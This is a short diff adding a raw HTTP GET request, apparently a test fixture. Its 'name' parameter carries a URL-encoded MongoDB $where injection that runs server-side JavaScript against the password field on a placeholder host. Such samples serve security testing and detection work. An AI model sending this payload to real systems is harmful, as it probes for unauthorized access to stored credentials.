@@ -1,0 +1,4 @@
+GET /a?name=%7B%22%24where%22%3A%22this.password.length%3E0%22%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
